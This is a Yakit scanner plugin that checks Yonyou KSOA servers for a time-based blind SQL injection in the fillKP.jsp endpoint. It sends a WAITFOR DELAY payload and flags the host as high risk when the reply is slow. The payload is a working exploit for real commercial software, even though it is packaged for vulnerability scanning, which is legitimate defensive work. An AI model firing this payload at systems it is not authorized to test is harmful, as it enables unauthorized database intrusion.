# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /kp/fillKP.jsp?kp_djbh=1%27+IF(LEN(db_name())>4)+WAITFOR%20DELAY%20%270:0:5%27+--+ HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close

`
    begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )
    resp_time=time.Since(begin_time)
    //dump(rsp)

    if int(resp_time) > 5000000000{
        risk.NewRisk(
            target, risk.severity("high"),
            risk.title(f"用友时空KSOA fillKP SQL注入漏洞 "),
            risk.titleVerbose("用友时空KSOA fillKP SQL注入漏洞"),
            risk.request(req),
            risk.response(rsp),
            risk.cve("no cve"),
            risk.details({
                "packet":string(packet1),
            }),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
